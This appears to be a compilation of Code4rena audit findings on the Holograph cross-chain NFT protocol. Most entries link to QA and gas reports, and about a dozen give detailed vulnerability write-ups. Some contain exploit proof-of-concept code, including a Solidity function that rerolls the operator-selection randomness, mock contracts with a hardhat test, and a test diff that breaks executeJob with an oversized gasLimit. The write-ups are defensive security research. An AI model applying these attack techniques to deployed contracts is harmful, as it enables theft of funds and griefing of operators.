See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JC-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xNazgul-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395   # Vulnerability details  Payout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients. This function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`  The issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.  This means `getEthPayout()` calls will leave dust in the contract.  ## Impact  If the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390). And `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.  ## Proof-Of-Concept  Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:  - Alice calls `getEthPayout()`, which in turn calls `_payoutEth()` - `gasCost = (23300 * length) + length = 23300 + 1 = 23301` - `balance = address(this).balance = 40000` - `balance - gasCost = 40000 - 23301 = 16699`, - `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699` - Alice receives `16699`.  Alice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.   ## Tools Used  Manual Analysis   ## Mitigation  The transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.  ```diff -391: balance = balance - gasCost; 392:     uint256 sending; 393:     // uint256 sent; 394:     for (uint256 i = 0; i < length; i++) { 395:       sending = ((bps[i] * balance) / 10000); 396:       addresses[i].transfer(sending); 397:       // sent = sent + sending; 398:     } ```
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Description Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.  If the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.  The docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob: ``` require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected"); ```  However, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional "bribe" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.  info about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment) info about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)  ## Impact  Dishonest operator can take honest operator's bond amount although gas price is above acceptable limits.  ## Tools Used  Manual audit, flashbot docs  ## Recommended Mitigation Steps  Do not use current tx.gasprice amount to infer gas price in a previous block.  Probably best to use gas price oracle.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code: ``` if (_isContract(to)) {   require(     (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&       ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&       ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==       ERC721TokenReceiver.onERC721Received.selector),     "ERC721: onERC721Received fail"   ); } ``` If the target address is a contract, the enforcer requires the target's onERC721Received() to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721): ``` interface ERC721TokenReceiver {     /// @notice Handle the receipt of an NFT     /// @dev The ERC721 smart contract calls this function on the recipient     ///  after a `transfer`. This function MAY throw to revert and reject the     ///  transfer. Return of other than the magic value MUST result in the     ///  transaction being reverted.     ///  Note: the contract address is always the message sender.     /// @param _operator The address which called `safeTransferFrom` function     /// @param _from The address which previously owned the token     /// @param _tokenId The NFT identifier which is being transferred     /// @param _data Additional data with no specified format     /// @return `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`     ///  unless throwing     function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4); } ```  The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the address(this) value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.  ## Impact  ERC721 transferFrom's "to" contract may fail to accept transfers, or record credit of transfers incorrectly.   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Pass the msg.sender parameter, as the ERC721 standard requires.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.   If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.  ## Impact  Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Funnel receive() empty calls down to the implementation.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121   # Vulnerability details  ## Description  ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.  The issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.   In the fallback function, the enforcer appends an additional 32 bytes of msg.sender : ``` assembly {   calldatacopy(0, 0, calldatasize())   mstore(calldatasize(), caller())   let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)   returndatacopy(0, 0, returndatasize())   switch result   case 0 {     revert(0, returndatasize())   }   default {     return(0, returndatasize())   } } ```  Indeed these are the bytes read as msgSender: ``` function msgSender() internal pure returns (address sender) {   assembly {     sender := calldataload(sub(calldatasize(), 0x20))   } } ```  and isOwner simply compares these to the stored owner: ``` function isOwner() external view returns (bool) {   if (msg.sender == holographer()) {     return msgSender() == _getOwner();   } else {     return msg.sender == _getOwner();   } } ```  However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom: ``` function safeTransferFrom(   address from,   address to,   uint256 tokenId,   bytes memory data ) public payable {   require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");   if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {     require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));   }   _transferFrom(from, to, tokenId);   if (_isContract(to)) {     require(       (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&         ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&         ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==         ERC721TokenReceiver.onERC721Received.selector),       "ERC721: onERC721Received fail"     );   }   if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {     require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));   } } ```  Here, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.  Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.   This pattern occurs with the following functions, which have an arbitrary data parameter: - beforeSafeTransfer / after SafeTransfer - beforeTransfer / afterTransfer - beforeOnERC721Received / afterOnERC721Received - beforeOnERC20Received / aferERC20Received  ## Impact  Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Refactor the code to represent msg.sender information in a bug-free way.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/brgltd-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340   # Vulnerability details    ## Impact Payout is blocked and tokens are stuck in contract.  ## Proof of Concept `PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients. Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.  ## Tools Used Code inspection  ## Recommended Mitigation Steps Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445   # Vulnerability details  ## Description  Holograph gets it's cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133)  The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters)  ## Impact  The impact is that when those fields are different between chains, one of two things may happen: 1. Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero) 2. More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.  The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Firstly,make sure to use the target gas costs. Secondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Josiah-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539   # Vulnerability details  ## Description  HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \_checkOnERC20Received:  ``` if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {   require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data)); } _transfer(account, recipient, amount); require(_checkOnERC20Received(account, recipient, amount, data), "ERC20: non ERC20Receiver"); if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {   require(SourceERC20().afterSafeTransfer(account, recipient, amount, data)); } ```  The checkOnERC20Received function: ``` if (_isContract(recipient)) {   try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {     require(erc165support, "ERC20: no ERC165 support");     // we have erc165 support     if (ERC165(recipient).supportsInterface(0x534f5876)) {       // we have eip-4524 support       try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv         return retval == ERC20Receiver.onERC20Received.selector;       } catch (bytes memory reason) {         if (reason.length == 0) {           revert("ERC20: non ERC20Receiver");         } else {           assembly {             revert(add(32, reason), mload(reason))           }         }       }     } else {       revert("ERC20: eip-4524 not supported");     }   } catch (bytes memory reason) {     if (reason.length == 0) {       revert("ERC20: no ERC165 support");     } else {       assembly {         revert(add(32, reason), mload(reason))       }     }   } } else {   return true; } ```  In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.  The specs warn us: ``` ⚠️ This EIP is not recommended for general use or implementation as it is likely to change.  ```  Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.  ## Impact  ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Remove the EIP-4524 requirements altogether.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875   # Vulnerability details  ## Description  Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():  ``` if (_operatorPods.length < pod) {   /**    * @dev activate pod(s) up until the selected pod    */   for (uint256 i = _operatorPods.length; i <= pod; i++) {     /**      * @dev add zero address into pod to mitigate empty pod issues      */     _operatorPods.push([address(0)]);   } } ```  The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:  1. bondUtilityToken(attacker, large_amount, high_pod_number) 2. unbondUtilityToken(attacker, attacker)  The above could be wrapped in a flashloan to get virtually any pod tier filled.  The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as "open season". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.   ## Impact  Any user can force chaotic "open season" operator behavior  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511   # Vulnerability details  ## Impact Using block.number and block.timestamp as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.  ## Proof of Concept An attack path for rerolling the result of bad randomness might look roughly like this:  ```js function attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{      bytes32 jobHash = keccak256(bridgeInRequestPayload);      //same calculation as in HolographOperator.crossChainMessage     uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));      require(wantedPodIndex == random % numPods)     require(wantedOperatorIndex == random % numOperators);      operator.crossChainMessage(bridgeInRequestPayload); } ```  The attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).  It should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/nicobevi-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478   # Vulnerability details  ## Impact ETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code. ```solidity File: contracts\HolographOperator.sol 419:     try 420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}( 421:         msg.sender, 422:         bridgeInRequestPayload 423:       ) 424:     { 425:       /// @dev do nothing 426:     } catch { 427:       _failedJobs[hash] = true; 428:       emit FailedOperatorJob(hash); 429:     } ```  Executing the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 ```solidity   function executeJob(bytes calldata bridgeInRequestPayload) external payable {          ...      /**      * @dev execute the job      */     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     }     /**      * @dev every executed job (even if failed) increments total message counter by one      */     ++_inboundMessageCounter;     /**      * @dev reward operator (with HLG) for executing the job      * @dev this is out of scope and is purposefully omitted from code      */     ////  _bondedOperators[msg.sender] += reward;   } ```  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478 ```solidity   function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {     require(msg.sender == address(this), "HOLOGRAPH: operator only call");     assembly {       /**        * @dev remove gas price from end        */       calldatacopy(0, payload.offset, sub(payload.length, 0x20))       /**        * @dev hToken recipient is injected right before making the call        */       mstore(0x84, msgSender)       /**        * @dev make non-reverting call        */       let result := call(         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value         mload(sub(payload.length, 0x40)),         /// @dev destination is bridge contract         sload(_bridgeSlot),         /// @dev any value is passed along         callvalue(),         /// @dev data is retrieved from 0 index memory position         0,         /// @dev everything except for last 32 bytes (gas limit) is sent         sub(payload.length, 0x40),         0,         0       )       if eq(result, 0) {         revert(0, 0)       }       return(0, 0)     }   } ```  ## Proof of Concept First, please add the following `OperatorAndBridgeMocks.sol` file in `src\mock\`. ```solidity pragma solidity 0.8.13;  // OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions contract OperatorMock {     bool public isJobExecuted = true;      BridgeMock bridgeMock = new BridgeMock();      // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function     function testExecuteJob() external payable {         try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {         } catch {             isJobExecuted = false;         }     }          // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function     function testBridgeCall() external payable {         // as a simulation, the external call that sends ETH to bridgeMock contract will revert         (bool success, ) = address(bridgeMock).call{value: msg.value}("");         if (!success) {             assembly {                 revert(0, 0)             }         }         assembly {             return(0, 0)         }     } }  interface IOperatorMock {     function testBridgeCall() external payable; }  contract BridgeMock {     receive() external payable {         revert();     } } ```  Then, please add the following `POC.ts` file in `test\`. ```typescript import { expect } from "chai"; import { ethers } from "hardhat";  describe('POC', () => {     it("It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function", async () => {         // deploy operatorMock contract that simulates         //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions         const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');         const operatorMock = await OperatorMockFactory.deploy();         await operatorMock.deployed();          await operatorMock.testExecuteJob({value: 500});          // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract         const isJobExecuted = await operatorMock.isJobExecuted();         expect(isJobExecuted).to.be.eq(false);         expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);     }); }); ```  Last, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate the described scenario.  ## Tools Used VSCode  ## Recommended Mitigation Steps In the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peiw-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415   # Vulnerability details   When a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user. Given that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.  ## Impact Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.  The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` * `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and 200 Gwei gas = 4 Matic, for Avalanche the block gas limit seems to be 8M and the price ~30 nAVAX = 0.24 AVAX ). Plus, the operator isn't going to receive that amount.  ## Proof of Concept The following test demonstrates this scenario:  ```diff diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts index 1f2b959..a1a23b7 100644 --- a/test/06_cross-chain_minting_tests_l1_l2.ts +++ b/test/06_cross-chain_minting_tests_l1_l2.ts @@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              gasLimit: TESTGASLIMIT,            })          ); +        estimatedGas = BigNumber.from(50_000_000);          // process.stdout.write('\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\n');            let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload( @@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),              payload            ); - +        estimatedGas = BigNumber.from(5_000_000); +                  process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());          await expect(            adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [ @@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              payload,              {                gasPrice: GASPRICE, -              gasLimit: executeJobGas(payload), +              gasLimit: 5_000_000,              },            ])          ) ```  The test would fail with the following output:  ```   1) Testing cross-chain minting (L1 & L2)        Deploy cross-chain contracts via bridge deploy          hToken            deploy l1 equivalent on l2:      VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left ```  ## Recommended Mitigation Steps Limit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rbserver-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Metatron-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/i_got_hacked-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakshamguruji-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/aysha-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ryshaw-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JrNet-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294   # Vulnerability details  During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`. The amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens). However, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job. The operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.   ## Impact Operator would be loosing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs). This could also be used by attackers to make operators pay for the attackers' expensive gas tasks: * They can deploy their own contract as the 'source contract' * Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed * They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)  ## Proof of Concept * An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.): > When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod. * Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code. * There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.  ## Recommended Mitigation Steps  Allow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Dinesh11G-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/djxploit-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Pheonix-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/lukris02-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/halden-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Tomio-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-Q.md).
